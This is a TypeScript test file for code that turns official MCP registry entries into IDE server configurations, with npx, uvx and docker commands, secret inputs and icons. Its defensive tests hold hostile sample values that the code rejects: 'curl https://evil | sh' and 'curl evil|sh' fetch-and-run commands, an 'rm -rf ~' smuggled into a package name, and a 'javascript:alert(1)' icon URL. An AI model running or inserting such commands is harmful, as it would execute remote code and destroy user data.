// D207: the official MCP registry's answers turned into gallery entries.
import assert from "node:assert/strict";
import { test } from "node:test";
import {
  DEFAULT_REGISTRY,
  parseRegistryList,
  parseRegistryServer,
  registryBase,
  registryEntry,
  registryId,
  registrySearchUrl,
  registryServerUrl,
} from "./registry";

test("registry addresses", () => {
  assert.equal(registryBase(undefined), DEFAULT_REGISTRY);
  assert.equal(registryBase("http://127.0.0.1:11999/"), "http://127.0.0.1:11999");
  assert.equal(registryBase("file:///x"), null);
  assert.equal(
    registrySearchUrl("https://r.dev", "git hub", 5),
    "https://r.dev/v0.1/servers?limit=5&version=latest&search=git+hub",
  );
  assert.equal(
    registryServerUrl("https://r.dev", "io.github.acme/weather"),
    "https://r.dev/v0.1/servers/io.github.acme%2Fweather/versions/latest",
  );
  assert.equal(registryId("io.github.acme/weather-mcp"), "weather-mcp");
  assert.equal(registryId("ai.smithery/@x y"), "x-y");
});

test("a search answer: latest servers, deleted ones left out", () => {
  const list = parseRegistryList({
    servers: [
      {
        server: { name: "a/one", description: "One" },
        _meta: { "io.modelcontextprotocol.registry/official": { status: "active" } },
      },
      { server: { name: "a/one", description: "dup" } },
      {
        server: { name: "a/gone" },
        _meta: { "io.modelcontextprotocol.registry/official": { status: "deleted" } },
      },
      { server: { description: "no name" } },
    ],
    metadata: { count: 4 },
  });
  assert.deepEqual(
    list.map((s) => s.name),
    ["a/one"],
  );
  assert.deepEqual(parseRegistryList({}), []);
  assert.equal(parseRegistryServer({ server: { name: "x/y" } })?.name, "x/y");
});

test("a remote with a secret header becomes an http server with a password input", () => {
  const entry = registryEntry({
    name: "ai.smithery/notes",
    description: "Notes",
    remotes: [
      { type: "sse", url: "https://old.example/sse" },
      {
        type: "streamable-http",
        url: "https://server.example/mcp",
        headers: [
          {
            name: "Authorization",
            value: "Bearer {smithery_api_key}",
            isSecret: true,
            description: "Bearer token",
          },
        ],
      },
    ],
  });
  assert.ok(entry);
  assert.equal(entry.kind, "remote");
  assert.deepEqual(entry.config, {
    type: "http",
    url: "https://server.example/mcp",
    headers: { Authorization: "Bearer ${input:smithery-api-key}" },
  });
  assert.deepEqual(entry.inputs, [
    { id: "smithery-api-key", description: "Authorization: smithery_api_key", password: true },
  ]);
});

test("packages run with npx, uvx or docker; required variables are asked for", () => {
  const npm = registryEntry({
    name: "io.github.acme/weather",
    title: "Weather",
    packages: [
      {
        registryType: "npm",
        identifier: "@acme/weather-mcp",
        version: "1.2.0",
        transport: { type: "stdio" },
        environmentVariables: [
          { name: "WEATHER_KEY", isSecret: true, isRequired: true, description: "API key" },
          { name: "UNITS", default: "metric" },
        ],
        packageArguments: [
          { type: "named", name: "--verbose" },
          { type: "positional", value: "serve" },
        ],
      },
    ],
  });
  assert.ok(npm);
  assert.equal(npm.title, "Weather");
  assert.equal(npm.needs, "Node.js");
  assert.deepEqual(npm.config, {
    type: "stdio",
    command: "npx",
    // `--verbose` has nothing to fill in: a flag, passed as it is.
    args: ["-y", "@acme/weather-mcp@1.2.0", "--verbose", "serve"],
    env: { WEATHER_KEY: "${input:weather-key}" },
  });
  assert.deepEqual(npm.inputs, [{ id: "weather-key", description: "API key", password: true }]);

  const py = registryEntry({
    name: "x/py",
    packages: [
      { registryType: "pypi", identifier: "py-mcp", version: "0.1", transport: { type: "stdio" } },
    ],
  });
  assert.deepEqual(py?.config, { type: "stdio", command: "uvx", args: ["py-mcp==0.1"] });

  const oci = registryEntry({
    name: "io.github.github/github-mcp-server",
    packages: [
      {
        registryType: "oci",
        identifier: "ghcr.io/github/github-mcp-server",
        version: "2.0.3",
        transport: { type: "stdio" },
        runtimeArguments: [
          {
            type: "named",
            name: "-e",
            value: "GITHUB_PERSONAL_ACCESS_TOKEN={token}",
            variables: { token: { isSecret: true, description: "GitHub token" } },
          },
        ],
      },
    ],
  });
  assert.deepEqual(oci?.config.args, [
    "run",
    "-i",
    "--rm",
    "-e",
    "GITHUB_PERSONAL_ACCESS_TOKEN=${input:token}",
    "ghcr.io/github/github-mcp-server:2.0.3",
  ]);
  assert.equal(oci?.inputs?.[0]?.password, true);

  // Anyone can publish: a runtime hint naming another program isn't taken, and an identifier
  // that would be read as an option (npx -c runs a shell command) isn't run at all.
  const hinted = (runtimeHint: string, identifier = "pkg") =>
    registryEntry({
      name: "x/h",
      packages: [{ registryType: "npm", identifier, runtimeHint, transport: { type: "stdio" } }],
    })?.config.command ?? null;
  assert.equal(hinted("bunx"), "bunx");
  assert.equal(hinted("bash"), "npx");
  assert.equal(hinted("curl https://evil | sh"), "npx");
  assert.equal(hinted("npx", "-c=curl evil|sh"), null);
  assert.equal(hinted("npx", "pkg; rm -rf ~"), null);

  // Nothing the IDE can run: an SSE-only remote, a nuget package, a package over http.
  assert.equal(
    registryEntry({
      name: "x/none",
      remotes: [{ type: "sse", url: "https://x/sse" }],
      packages: [
        { registryType: "nuget", identifier: "X" },
        { registryType: "npm", identifier: "y", transport: { type: "streamable-http" } },
      ],
    }),
    null,
  );
});

test("boolean flags: passed by name, left out when false; optional options without a value aren't", () => {
  const entry = registryEntry({
    name: "io.github.acme/flags",
    packages: [
      {
        registryType: "npm",
        identifier: "flags-mcp",
        transport: { type: "stdio" },
        packageArguments: [
          { type: "named", name: "--stdio" },
          { type: "named", name: "--read-only", format: "boolean", description: "No writes" },
          { type: "named", name: "--debug", format: "boolean", default: "false" },
          { type: "named", name: "--color", format: "boolean", value: "true" },
          // An option the user may set: there's a value to ask for, so without one it's left out.
          { type: "named", name: "--port", description: "Port", valueHint: "port" },
        ],
      },
    ],
  });
  // An optional boolean with no value is off (`--read-only` here): set ones and bare ones pass.
  assert.deepEqual(entry?.config.args, ["-y", "flags-mcp", "--stdio", "--color"]);
  assert.equal(entry?.inputs, undefined);
});

test("server.json icons are kept, checked", () => {
  const entry = registryEntry({
    name: "io.github.acme/pics",
    icons: [
      { src: "https://acme.dev/icon.png", mimeType: "image/png", sizes: ["64x64"] },
      { src: "http://acme.dev/plain.png" },
      { src: "javascript:alert(1)" },
    ],
    remotes: [{ type: "streamable-http", url: "https://acme.dev/mcp" }],
  });
  assert.deepEqual(entry?.icons, [
    { src: "https://acme.dev/icon.png", mimeType: "image/png", sizes: ["64x64"] },
  ]);
  const plain = registryEntry({
    name: "io.github.acme/none",
    remotes: [{ type: "streamable-http", url: "https://acme.dev/mcp" }],
  });
  assert.equal(plain?.icons, undefined);
});
